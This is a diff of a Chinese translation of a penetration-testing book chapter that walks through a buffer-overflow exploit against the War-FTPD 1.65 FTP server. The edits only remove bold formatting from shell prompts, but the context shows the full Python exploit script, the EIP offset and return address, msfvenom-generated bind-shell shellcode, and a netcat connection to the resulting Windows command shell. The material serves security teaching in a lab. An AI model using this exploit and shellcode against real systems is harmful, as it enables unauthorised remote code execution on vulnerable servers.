@@ -49,7 +49,7 @@
 示例 17-1. Python 利用代码导致 War-FTP 崩溃
 
 ```
-root@kali:~# **cat ftpexploit**
+root@kali:~# cat ftpexploit
 #!/usr/bin/python
 import socket
 buffer = "A" * 1100
@@ -69,8 +69,8 @@ s.close()
 如果服务器响应并请求我们的密码，利用代码准备好使用密码 *PASSWORD* 完成连接。然而，如果我们的利用成功了，即使我们的凭据有效也无关紧要，因为程序会在完成登录过程之前崩溃。最后，我们关闭我们的 socket，利用代码结束。确保 Python 脚本是可执行的，可以使用 `chmod +x` 命令，并按照下面的示例运行利用代码。
 
 ```
-root@kali:~# **chmod +x ftpexploit**
-root@kali:~# **./ftpexploit**
+root@kali:~# chmod +x ftpexploit
+root@kali:~# ./ftpexploit
 220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
 220 Please enter your user name.
 331 User name okay, Need password.
@@ -138,7 +138,7 @@ Bk4Bk5Bk
 示例 17-3. 带有循环模式的漏洞利用
 
 ```
-  root@kali:~# **cat ftpexploit**
+  root@kali:~# cat ftpexploit
   #!/usr/bin/python
   import socket
 ❶ buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
@@ -170,7 +170,7 @@ Bk4Bk5Bk
 现在重新运行漏洞利用，使用从❶开始的生成模式，替换掉 1,100 个* A *。
 
 ```
-root@kali:~# **./ftpexploit**
+root@kali:~# ./ftpexploit
 220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
 220 Please enter your user name.
 331 User name okay, Need password.
@@ -200,7 +200,7 @@ EBP (0x00affda0) points at offset 581 in normal pattern (length 519)
 示例 17-4. 验证 EIP 偏移
 
 ```
-  root@kali:~# **cat ftpexploit**
+  root@kali:~# cat ftpexploit
   #!/usr/bin/python
   import socket
 ❶ buffer = "A" * 485 + "B" * 4 + "C" * 611
@@ -278,7 +278,7 @@ EBP (0x00affda0) points at offset 581 in normal pattern (length 519)
 示例 17-5. 使用来自可执行模块的返回地址
 
 ```
-root@kali:~# **cat ftpexploit**
+root@kali:~# cat ftpexploit
 #!/usr/bin/python
 import socket
 buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "D" * 607 ❶
@@ -328,7 +328,7 @@ s.close()
 示例 17-6. 使用 Msfvenom 生成 shellcode
 
 ```
-root@kali:~# **msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d'**
+root@kali:~# msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d'
 [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
 buf =
 "\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
@@ -365,7 +365,7 @@ Msfvenom 生成的 shellcode 大小为 368 字节，给我们留出了足够的�
 示例 17-7. 我们完成的漏洞利用
 
 ```
-root@kali:~# **cat ftpexploit**
+root@kali:~# cat ftpexploit
 #!/usr/bin/python
 import socket
 shellcode = ("\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
@@ -420,8 +420,8 @@ Msfvenom 生成的编码 shellcode 在执行之前需要先解码，在解码过
 示例 17-8. 使用 Metasm 生成 shellcode
 
 ```
-root@kali:~# **cd /usr/share/metasploit-framework/tools/**
-root@kali:/usr/share/metasploit-framework/tools# **./metasm_shell.rb**
+root@kali:~# cd /usr/share/metasploit-framework/tools/
+root@kali:/usr/share/metasploit-framework/tools# ./metasm_shell.rb
 type "exit" or "quit" to quit
 use ";" or "\n" for newline
 metasm > **sub esp, 1500**❶
@@ -481,7 +481,7 @@ s.close()
 将 ESP 移开后，并且确保我们的 shellcode 在解码或执行过程中不会被破坏，再次运行漏洞利用，并使用 Kali Linux 上的 Netcat 连接到 Windows 目标的 TCP 端口 4444，如下所示。
 
 ```
-root@kali:~# **nc 192.168.20.10 4444**
+root@kali:~# nc 192.168.20.10 4444
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
